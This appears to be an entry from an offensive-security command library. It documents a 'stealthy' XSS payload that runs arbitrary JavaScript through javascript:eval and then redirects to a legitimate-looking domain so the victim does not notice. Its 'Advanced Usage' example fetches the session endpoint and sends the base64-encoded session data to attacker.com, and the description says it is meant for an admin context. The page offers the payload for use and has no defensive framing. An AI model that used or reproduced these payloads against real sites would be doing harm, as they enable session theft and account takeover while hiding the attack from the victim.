---
data: 'javascript:eval(''malicious code;window.location="https://correctdomain.com"'');'
tags:
  - xss
  - stealth
  - exfiltration
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:47:12.646Z'
id: 07ff86ea-f146-4b2d-a831-a9d247121b44
verified: false
validated: true
submitted: true
---
# javascript-eval-stealthy

## Command

```javascript
javascript:eval('malicious code;window.location="https://correctdomain.com"');
```

## Description

Stealthy XSS payload using eval to execute arbitrary malicious JavaScript silently, followed by a redirect to a legitimate domain to mask the attack and avoid suspicion during execution in the admin context.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| malicious code | Arbitrary JS to run (e.g., fetch for exfiltration) | Yes |
| window.location | Redirect URL to hide execution | Yes |

## Examples

### Basic Usage

```javascript
javascript:eval('alert("XSS");window.location="https://example.com"');
```

### Advanced Usage

```javascript
javascript:eval('fetch("/api/session").then(r=>r.text()).then(d=>new Image().src="https://attacker.com?"+btoa(d));window.location="https://correctdomain.com"');
```

Exfiltrate session data before redirect.

## Expected Output

Executes malicious code without visible alerts, then redirects to the specified URL seamlessly.

## Related

- [[commands/javascript-alert-domain]]
- [[procedures/Inject-XSS-into-Custom-Domain]]
